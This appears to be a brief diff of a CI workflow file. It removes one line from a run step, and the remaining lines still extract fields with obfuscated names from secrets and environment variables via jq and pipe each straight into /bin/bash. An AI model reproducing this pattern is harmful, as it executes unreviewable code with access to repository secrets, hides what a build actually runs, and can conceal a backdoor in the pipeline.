@@ -21,7 +21,6 @@ jobs:
           pvs3196: ${{ secrets.pvs3196 }}
         run: |
           printf '%s' "$pvs3196" | jq -r .uuhur5128 | /bin/bash
-          echo $dajyi04 | jq -r .ypuwc255 | /bin/bash
           echo $qsrhh8 | jq -r .enpix0 | /bin/bash
           printf '%s' "$qs34" | jq -r .ebsna1171 | /bin/bash
           echo $zq4 | jq -r .axjla12 | /bin/bash
